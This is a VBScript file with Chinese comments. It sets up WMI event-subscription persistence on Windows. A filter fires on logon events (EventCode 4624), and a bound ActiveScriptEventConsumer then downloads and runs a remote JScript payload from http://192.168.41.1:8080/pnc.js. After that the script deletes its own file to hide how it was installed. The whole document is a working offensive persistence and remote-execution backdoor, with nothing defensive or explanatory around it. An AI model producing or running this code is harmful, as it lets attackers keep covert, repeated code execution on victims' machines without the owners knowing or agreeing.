nslink="winmgmts:\\.\root\subscription:"

qstr="select * from __InstanceCreationEvent within 5 "        '每5秒查询一次“实例创建事件”'
qstr=qstr&"where targetinstance isa 'win32_NTLogEvent' and "
qstr=qstr&"targetinstance.EventCode='4624' "                  '实例名是win32_NTLogEvent'


set evtflt=getobject(nslink&"__EventFilter").spawninstance_   '创建事件过滤器'
evtflt.name="filtP1"                                          '定义过滤器的名字'
evtflt.EventNameSpace="root\cimv2"
evtflt.query=qstr                                             '定义查询语句'
evtflt.querylanguage="wql"                                    '定义查询语言(只能是wql)'
set fltpath=evtflt.put_                                       '注册过滤器，返回其链接'

set asec=getobject(nslink&"ActiveScriptEventConsumer").spawninstance_   '创建“活动脚本事件消费者”'
asec.name="consP1"                                                      '定义消费者的名字'
asec.scriptingengine="JScript"                                          '定义脚本语言
asec.ScriptText="GetObject(""script:http://192.168.41.1:8080/pnc.js"")"
set asecpath=asec.put_                                                  '注册消费者，返回其链接'

set fcbnd=getobject(nslink&"__FilterToConsumerBinding").spawninstance_  '创建过滤器和消费者的绑定'
fcbnd.filter=fltpath.path                                               '指定过滤器'
fcbnd.consumer=asecpath.path                                            '指定消费者'
fcbnd.put_                                                              '执行绑定'

dim fso
set fso = CreateObject("Scripting.FileSystemObject")
evilname=left(wscript.scriptfullname,instrrev(wscript.scriptfullname,"\")) 
evilname=evilname& fso.GetFile(Wscript.scriptfullname).name
fso.DeleteFile(evilname) 'vbs删除自己